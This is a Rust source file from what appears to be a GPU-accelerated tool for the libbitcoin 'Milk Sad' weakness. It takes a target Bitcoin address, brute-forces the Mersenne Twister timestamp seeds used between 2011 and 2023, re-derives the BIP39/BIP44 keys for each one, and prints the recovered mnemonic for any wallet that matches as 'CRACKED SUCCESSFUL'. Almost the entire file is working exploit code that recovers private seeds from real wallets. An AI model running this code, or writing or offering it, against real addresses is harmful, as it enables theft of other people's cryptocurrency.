#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;
use anyhow::Result;
#[cfg(feature = "gpu")]
use bip39::Mnemonic;
#[cfg(feature = "gpu")]
use bitcoin::bip32::{DerivationPath, Xpriv};
#[cfg(feature = "gpu")]
use bitcoin::secp256k1::Secp256k1;
#[cfg(feature = "gpu")]
use bitcoin::{Address, Network};
#[cfg(feature = "gpu")]
use rand_mt::Mt19937GenRand32;
#[cfg(feature = "gpu")]
use std::str::FromStr;
use tracing::{info, warn};

/// Libbitcoin "Milk Sad" Vulnerability (100% GPU)
/// MT19937 seeded with unix timestamp (seconds)
pub fn run() -> Result<()> {
    info!("Milk Sad Vulnerability Scanner (100% GPU)");
    info!("This scanner requires a target address. Use: milk-sad --target <address>");
    info!("For address generation mode, use the original hybrid implementation.");

    Ok(())
}

pub fn run_with_target(
    target: String,
    start_ts_opt: Option<u32>,
    end_ts_opt: Option<u32>,
    multipath: bool,
) -> Result<()> {
    info!("Milk Sad Vulnerability Scanner (100% GPU)");
    if multipath {
        info!("Mode: Multi-Path (Checking 30 addresses per timestamp)");
    } else {
        info!("Mode: Single-Path (Checking m/44'/0'/0'/0/0 only)");
    }
    info!("Target Address: {}", target);

    use bitcoin::Address; // v0.32: Address is at bitcoin::Address
    use std::str::FromStr;
    // Parse address - v0.32 returns Address<NetworkUnchecked>
    let address = Address::from_str(&target)?.assume_checked();
    let script = address.script_pubkey();
    if !script.is_p2pkh() {
        warn!("Warning: Not a P2PKH address, skipping.");
        return Ok(());
    }
    let target_hash160_slice = &script.as_bytes()[3..23];
    let mut target_hash160: [u8; 20] = [0; 20];
    target_hash160.copy_from_slice(target_hash160_slice);

    info!("Target Hash160: {}", hex::encode(&target_hash160));

    // Time range: Allow custom or default to 2011-2023
    let start_ts = start_ts_opt.unwrap_or(1293840000u32); // 2011-01-01
    let end_ts = end_ts_opt.unwrap_or(1690848000u32); // 2023-08-01

    info!(
        "Scanning timestamps {} to {} ({} seconds)...",
        start_ts,
        end_ts,
        end_ts - start_ts
    );

    #[cfg(not(feature = "gpu"))]
    {
        warn!("This scanner requires GPU acceleration. Please recompile with --features gpu");
        return Err(anyhow::anyhow!("GPU feature disabled"));
    }

    #[cfg(feature = "gpu")]
    {
        let start_time = std::time::Instant::now();
        let solver = GpuSolver::new()?;
        info!("[GPU] Solver initialized");

        if multipath {
            let results = solver.compute_milk_sad_crack_multipath(start_ts, end_ts, &target_hash160)?;
            if !results.is_empty() {
                info!(
                    "\n[GPU] Found {} potential candidates. Verifying...",
                    results.len()
                );
                for (timestamp, addr_idx) in results {
                    // Verify on CPU
                    let entropy = generate_milk_sad_entropy(timestamp);
                    let derived_address = generate_address_from_entropy(&entropy, addr_idx);

                    if derived_address == target {
                        info!("\n[VERIFIED] 🔓 CRACKED SUCCESSFUL!");
                        info!("Timestamp: {}", timestamp);
                        info!("Address Index: {}", addr_idx);
                        info!("Entropy: {}", hex::encode(&entropy));
                        info!(
                            "Mnemonic: {}",
                            Mnemonic::from_entropy(&entropy)
                                .expect("Valid entropy should produce valid mnemonic")
                        );
                    } else {
                        info!(
                            "[FALSE POSITIVE] Timestamp {} (Index {}) -> {}",
                            timestamp, addr_idx, derived_address
                        );
                    }
                }
            } else {
                info!("\nScan complete. No match found.");
            }
        } else {
            let results = solver.compute_milk_sad_crack(start_ts, end_ts, &target_hash160)?;
            if !results.is_empty() {
                info!(
                    "\n[GPU] Found {} potential candidates. Verifying...",
                    results.len()
                );
                for timestamp in results {
                    // Verify on CPU (index 0)
                    let entropy = generate_milk_sad_entropy(timestamp as u32);
                    let derived_address = generate_address_from_entropy(&entropy, 0);

                    if derived_address == target {
                        info!("\n[VERIFIED] 🔓 CRACKED SUCCESSFUL!");
                        info!("Timestamp: {}", timestamp);
                        info!("Entropy: {}", hex::encode(&entropy));
                        info!(
                            "Mnemonic: {}",
                            Mnemonic::from_entropy(&entropy)
                                .expect("Valid entropy should produce valid mnemonic")
                        );
                    } else {
                        info!(
                            "[FALSE POSITIVE] Timestamp {} -> {}",
                            timestamp, derived_address
                        );
                    }
                }
            } else {
                info!("\nScan complete. No match found.");
            }
        }
        info!("Time elapsed: {:.2}s", start_time.elapsed().as_secs_f64());
        Ok(())
    }
}

/// Generate 128-bit entropy using MT19937 with MSB extraction
#[cfg(feature = "gpu")]
fn generate_milk_sad_entropy(timestamp: u32) -> [u8; 16] {
    let mut rng = Mt19937GenRand32::new(timestamp);
    let mut entropy = [0u8; 16];
    for i in 0..4 {
        let val = rng.next_u32();
        entropy[i * 4] = ((val >> 24) & 0xFF) as u8;
        entropy[i * 4 + 1] = ((val >> 16) & 0xFF) as u8;
        entropy[i * 4 + 2] = ((val >> 8) & 0xFF) as u8;
        entropy[i * 4 + 3] = (val & 0xFF) as u8;
    }
    entropy
}

/// Generate Bitcoin address from entropy using BIP39/BIP44
#[cfg(feature = "gpu")]
fn generate_address_from_entropy(entropy: &[u8; 16], addr_index: u32) -> String {
    let mnemonic = Mnemonic::from_entropy(entropy)
        .expect("Failed to create mnemonic from entropy - this should not happen with valid 16-byte entropy");
    let seed = mnemonic.to_seed("");

    let secp = Secp256k1::new();
    let root =
        Xpriv::new_master(Network::Bitcoin, &seed).expect("Failed to create master key from seed");

    // Path: m/44'/0'/0'/0/i
    let path_str = format!("m/44'/0'/0'/0/{}", addr_index);
    let path = DerivationPath::from_str(&path_str)
        .expect("Failed to parse derivation path - hardcoded path should be valid");
    let derived = root
        .derive_priv(&secp, &path)
        .expect("Failed to derive child key");

    let private_key = bitcoin::PrivateKey::new(derived.private_key, Network::Bitcoin);
    let pubkey = private_key.public_key(&secp);
    let address = Address::p2pkh(&pubkey, Network::Bitcoin);

    address.to_string()
}
